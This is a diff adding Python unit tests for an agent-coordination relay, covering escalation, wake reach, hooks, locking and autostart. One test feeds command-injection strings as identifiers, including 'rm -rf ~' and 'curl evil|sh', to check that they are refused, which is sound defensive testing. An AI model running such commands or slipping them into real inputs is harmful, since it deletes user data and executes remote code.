@@ -173,7 +173,8 @@ class LadderTests(RelayFixture):
         self.ingress("actor:codex", probe["event_id"])
         self.settle(1)
         row = wake.reach(self.rendezvous._events())["participants"]["actor:codex"]
-        self.assertEqual(row["best"], {"rung": "W1", "binding_id": binding["binding_id"], "state": "wake-verified"})
+        self.assertEqual(row["best"], {"rung": "W1", "binding_id": binding["binding_id"], "state": "wake-verified",
+                                       "reaches": "the open session"})
         self.assertEqual(row["bindings"][0]["acknowledged_via"], "host-prompt-hook")
         # The relay never records a recipient receipt itself.
         self.assertFalse([e for e in self.relay_events() if e["kind"] in {"coop2.tickle.acked", "coop2.interaction.observed"}])
@@ -198,7 +199,7 @@ class LadderTests(RelayFixture):
         result = wake.outcome(self.rendezvous._events(), event_id)
         self.assertEqual(result["state"], "received")
         self.assertIn("host-launch", [row["via"] for row in result["trail"]])
-        self.assertEqual(self.relay.state()["jobs"][event_id]["state"], "received")
+        self.assertEqual(self.relay.state()["jobs"][event_id]["state"], "engagement-watch")
         self.assertEqual(headless["class"], "W2")
 
     def test_failing_binding_trips_the_breaker_and_is_disclosed(self) -> None:
@@ -383,6 +384,176 @@ class AdapterTests(unittest.TestCase):
         self.assertIn("Claude has a consultation waiting", log)
         self.assertEqual(calls[0][0], ["notify"])
         self.assertIn("Claude has a consultation waiting", calls[0][1]["env"]["AWP_NOTICE"])
+
+
+
+class ReviewFindingTests(RelayFixture):
+    """Fixes from the 2026-09-11 architecture review (docs/reviews)."""
+
+    def send(self, recipient="actor:codex", sender="actor:claude", subject="s"):
+        return self.rendezvous.send(sender, recipient, "review", subject, "q?", sender, 1, 4, 1200, 300, 600)
+
+    def test_received_but_not_engaged_escalates_to_the_principal(self) -> None:
+        live = self.declare("actor:codex", "W1", "codex-queue", params={"session_ref": "t"})
+        notify = self.declare("actor:codex", "W5", "desktop-notify")
+        self.settle()
+        event_id = self.send()["receipt"]["event_id"]
+        self.settle(1)
+        self.ingress("actor:codex", event_id)  # the prompt hook: notice entered the session
+        self.settle(1)
+        self.assertEqual(self.relay.state()["jobs"][event_id]["state"], "engagement-watch")
+        self.offset = timedelta(seconds=400)
+        self.settle(1)
+        self.assertEqual(self.relay.state()["jobs"][event_id]["state"], "engagement-escalated")
+        notified = [e for e in self.relay_events(wake.PRINCIPAL_NOTIFIED) if e["payload"]["event_id"] == event_id]
+        self.assertIn("not accepted, refused, or answered", notified[0]["payload"]["reason"])
+        self.assertEqual(len(self.adapters[notify["binding_id"]].calls), 1)
+        self.assertEqual(live["class"], "W1")
+
+    def test_engaged_consultation_closes_without_escalation(self) -> None:
+        self.declare("actor:codex", "W1", "codex-queue", params={"session_ref": "t"})
+        self.settle()
+        sent = self.send()
+        self.settle(1)
+        self.ingress("actor:codex", sent["receipt"]["event_id"])
+        self.rendezvous.accept("actor:codex", sent["interaction_id"], 600)
+        self.settle(1)
+        self.assertEqual(self.relay.state()["jobs"][sent["receipt"]["event_id"]]["state"], "engaged")
+
+    def test_consultation_handled_by_a_new_run_also_tells_the_principal(self) -> None:
+        headless = self.declare("actor:codex-app", "W2", "codex-exec")
+        notify = self.declare("actor:codex-app", "W5", "desktop-notify")
+        self.settle()
+        event_id = self.send(recipient="actor:codex-app")["receipt"]["event_id"]
+        self.settle(1)
+        self.offset = timedelta(seconds=10)
+        self.settle(1)
+        self.assertEqual(len(self.adapters[headless["binding_id"]].calls), 2)  # declaration probe, then the run
+        notified = [e for e in self.relay_events(wake.PRINCIPAL_NOTIFIED) if e["payload"]["event_id"] == event_id]
+        self.assertEqual(notified[0]["payload"]["reason"], "handled by a new run of the agent, not its open session")
+        self.assertEqual(len(self.adapters[notify["binding_id"]].calls), 1)
+        rows = wake.reach(self.rendezvous._events())["participants"]["actor:codex-app"]["bindings"]
+        self.assertEqual(rows[0]["reaches"], "a new run of the agent, not its open session")
+
+    def test_subscribed_hosted_agent_gets_no_relay_heartbeat(self) -> None:
+        self.declare("actor:claude", "W1", "git-signal",
+                     params={"signal_ref": wake.signal_ref("actor:claude"), "remote_url": "https://example.invalid/r.git"})
+        self.declare("actor:codex", "W1", "codex-queue", params={"session_ref": "t"})
+        self.assertEqual(self.relay.step()["heartbeats"], ["actor:codex"])
+
+    def test_reach_goes_stale_after_its_time_to_live(self) -> None:
+        binding = self.declare("actor:codex", "W1", "codex-queue", params={"session_ref": "t"})
+        self.settle()
+        probe = next(e for e in self.rendezvous._events() if e["kind"] == "coop2.tickle.sent")
+        self.ingress("actor:codex", probe["event_id"])
+        later = wake.utc_now() + timedelta(seconds=wake.REACH_TTL_SECONDS + 60)
+        best = wake.reach(self.rendezvous._events(), now=later)["participants"]["actor:codex"]["best"]
+        self.assertEqual((best["state"], best["binding_id"]), ("wake-stale", binding["binding_id"]))
+
+    def test_unsafe_identifiers_are_refused_everywhere(self) -> None:
+        from tools.awp_activation import ActivationError, delivery_message
+        from tools.awp_coordination import CoordinationError
+
+        with self.assertRaises(CoordinationError):
+            self.rendezvous.join("actor:x`; rm -rf ~ #", [])
+        envelope = {"recipient_actor": "actor:x; curl evil|sh", "event_id": "evt:1", "event_kind": "coop2.tickle.sent"}
+        with self.assertRaises(ActivationError):
+            delivery_message(envelope)
+        self.rendezvous._append("actor:claude", "coop2.tickle.sent",
+                                {"tickle_id": "tickle:bad", "recipient": "actor:codex", "ttl_seconds": 90})
+        result = self.relay.step()
+        self.assertTrue(any("malformed" in note for note in result["notes"]))
+
+    def test_arm_hook_is_idempotent_and_wakes_via_async_rewake(self) -> None:
+        directory = self.project / "claude-home"
+        ref = wake.signal_ref("actor:claude")
+        for _ in range(2):
+            wake.arm_hook("actor:claude", "https://example.invalid/r.git", ref, directory=directory)
+        settings = json.loads((directory / "settings.json").read_text())
+        stop = settings["hooks"]["Stop"]
+        self.assertEqual(len(stop), 1)
+        self.assertTrue(stop[0]["hooks"][0]["asyncRewake"])
+        with self.assertRaises(wake.WakeError):
+            wake.arm_hook("actor:claude", "http://insecure/r.git", ref, directory=directory)
+
+    def test_signal_ref_never_grows_history(self) -> None:
+        import subprocess
+
+        bare = self.project / "signals.git"
+        subprocess.run(["git", "init", "-q", "--bare", str(bare)], check=True)
+        subprocess.run(["git", "config", "awp.wake.remote", str(bare)], cwd=self.project, check=True)
+        binding = self.declare("actor:claude", "W1", "git-signal",
+                               params={"signal_ref": wake.signal_ref("actor:claude"), "remote_url": "https://example.invalid/r.git"})
+        adapter = wake.adapter_for(binding, self.project)
+        envelope = {"type": "cooperation_activation_envelope", "module": "urn:awp:cooperation",
+                    "profile": "awp-host-activation-v1", "operation_id": "op", "binding_id": "b", "project_id": "p",
+                    "workstate_id": "w", "recipient_actor": "actor:claude", "route_id": "r", "route_generation": "g",
+                    "event_id": "evt:1", "event_kind": "coop2.tickle.sent", "interaction_id": "t", "ledger_frontier": []}
+        for _ in range(3):
+            self.assertEqual(adapter.deliver(envelope)["state"], "accepted")
+        count = subprocess.run(["git", "--git-dir", str(bare), "rev-list", "--count", wake.signal_ref("actor:claude")],
+                               capture_output=True, text=True, check=True).stdout.strip()
+        self.assertEqual(count, "1")
+
+
+class RelayProcessTests(unittest.TestCase):
+    def test_only_one_relay_holds_the_clone_lock(self) -> None:
+        from tools.awp_relay import SingletonLock
+
+        with tempfile.TemporaryDirectory() as directory:
+            path = Path(directory) / "relay.lock"
+            first, second = SingletonLock(path), SingletonLock(path)
+            self.assertTrue(first.acquire())
+            if os.name == "nt":
+                self.assertFalse(second.acquire())
+            else:
+                # flock is per open file description; model a second process.
+                import subprocess, sys
+                code = ("import sys; sys.path.insert(0, %r); from pathlib import Path; from tools.awp_relay import SingletonLock;"
+                        " sys.exit(0 if SingletonLock(Path(%r)).acquire() else 3)") % (str(Path(__file__).resolve().parents[1]), str(path))
+                self.assertEqual(subprocess.run([sys.executable, "-c", code]).returncode, 3)
+            first.release()
+            self.assertTrue(second.acquire())
+            second.release()
+
+    def test_autostart_watchdog_runs_ensure_every_five_minutes_without_admin(self) -> None:
+        from tools import awp_relay
+
+        project = Path("C:/Users/Mark/awp") if os.name == "nt" else Path("/work/awp")
+        windows = awp_relay.autostart_plan(project, "windows")
+        create = windows["commands"][0]
+        self.assertEqual(create[:2], ["schtasks", "/Create"])
+        self.assertIn("ensure", create[create.index("/TR") + 1])
+        self.assertEqual(create[create.index("/SC") + 1:create.index("/SC") + 4], ["MINUTE", "/MO", "5"])
+        self.assertNotIn("/RL", create)  # no elevated run level
+        with tempfile.TemporaryDirectory() as directory:
+            home = Path(directory)
+            linux = awp_relay.autostart_plan(project, "linux", home=home)
+            self.assertTrue(any(path.endswith(".timer") for path in linux["files"]))
+            calls = []
+            fake = lambda command, **kwargs: calls.append(command) or mock.Mock(returncode=0, stdout="", stderr="")
+            (home / ".awp-runtime").mkdir()
+            result = awp_relay.install_autostart(home, runner=fake, plan=linux)
+            self.assertEqual(result["state"], "installed")
+            self.assertEqual(calls[-1][:3], ["systemctl", "--user", "enable"])
+            with mock.patch("tools.awp_wake._git_config", return_value=None):
+                self.assertEqual(awp_relay.ensure_autostart(home, runner=fake)["state"], "present")
+            with mock.patch("tools.awp_wake._git_config", return_value="false"):
+                self.assertEqual(awp_relay.ensure_autostart(home, runner=fake)["state"], "disabled")
+
+    def test_spool_prunes_old_answered_requests(self) -> None:
+        import time as _time
+        from tools.awp_request_spool import RequestSpool
+
+        with tempfile.TemporaryDirectory() as directory:
+            spool = RequestSpool(Path(directory))
+            spool.submit("actor:a", "op:1", {"actor": "actor:a"})
+            spool.process(lambda request: {"ok": True})
+            old = _time.time() - 10 * 86400
+            for path in Path(directory).rglob("*.re*"):
+                os.utime(path, (old, old))
+            self.assertEqual(spool.prune(7 * 86400), 1)
+            self.assertEqual(list(Path(directory).rglob("*.request")), [])
 
 
 if __name__ == "__main__":
